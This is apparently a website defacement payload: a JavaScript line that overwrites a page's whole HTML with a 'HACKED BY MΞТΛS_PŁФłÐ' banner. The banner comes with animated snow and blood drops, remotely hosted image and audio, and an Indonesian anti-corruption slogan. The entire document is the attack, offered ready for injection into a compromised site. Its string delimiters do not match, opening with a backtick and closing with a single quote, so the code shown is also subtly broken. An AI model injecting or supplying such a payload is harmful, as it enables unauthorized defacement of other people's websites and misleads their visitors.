document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKED BY MΞТΛS_PŁФłÐ</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: black;
      color: white;
      font-family: monospace;
      text-align: center;
      overflow: hidden;
    }

    .container {
      border: 4px solid;
      border-image: linear-gradient(to right, cyan, red, cyan) 1;
      padding: 30px;
      margin: 60px auto;
      background-color: #111;
      max-width: 500px;
      position: relative;
      z-index: 1;
    }

    h1 {
      color: red;
      font-size: 28px;
      margin-bottom: 20px;
      text-shadow: 0 0 8px red;
    }

    img {
      width: 250px;
      height: 250px;
      object-fit: cover;
      border-radius: 50%;
      margin-bottom: 20px;
      box-shadow: 0 0 20px cyan;
      border: 3px solid red;
    }

    p {
      font-size: 16px;
      color: #ccc;
    }

    .hashtag {
      margin-top: 10px;
      font-weight: bold;
      color: #ff0044;
    }

    button {
      margin-top: 25px;
      padding: 10px 20px;
      font-size: 16px;
      background-color: red;
      color: white;
      border: none;
      cursor: pointer;
      box-shadow: 0 0 10px red;
    }

    button:hover {
      background-color: #ff5555;
    }

    /* Snow & blood */
    .snowflake, .blood {
      position: fixed;
      top: -10px;
      z-index: 0;
      user-select: none;
      pointer-events: none;
      animation: fall linear infinite;
    }

    .snowflake {
      color: white;
      font-size: 12px;
    }

    .blood {
      color: red;
      font-size: 10px;
    }

    @keyframes fall {
      to {
        transform: translateY(100vh);
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>HACKED BY<br>MΞТΛS_PŁФłÐ</h1>
    <img src="https://files.catbox.moe/ll57kv.png" alt="Hacked Image">
    <p>negara ini sudah hancur oleh tikus' yg di kembang biakan di negara ini, miris sekali</p>
    <div class="hashtag">#koruptorhama</div>
    <button onclick="playAudio()">PLAY AUDIO</button>
    <audio id="bgAudio">
      <source src="https://files.catbox.moe/qv6cys.mp3" type="audio/mpeg">
    </audio>
  </div>

  <!-- Snow and blood drops -->
  <script>
    const snowCount = 40;
    const bloodCount = 25;

    for (let i = 0; i < snowCount; i++) {
      let snow = document.createElement("div");
      snow.className = "snowflake";
      snow.style.left = Math.random() * 100 + "vw";
      snow.style.animationDuration = 3 + Math.random() * 5 + "s";
      snow.innerHTML = "❄️";
      document.body.appendChild(snow);
    }

    for (let i = 0; i < bloodCount; i++) {
      let blood = document.createElement("div");
      blood.className = "blood";
      blood.style.left = Math.random() * 100 + "vw";
      blood.style.animationDuration = 2 + Math.random() * 4 + "s";
      blood.innerHTML = "💧";
      document.body.appendChild(blood);
    }

    function playAudio() {
      const audio = document.getElementById("bgAudio");
      audio.play();
    }
  </script>

</body>
</html> ';

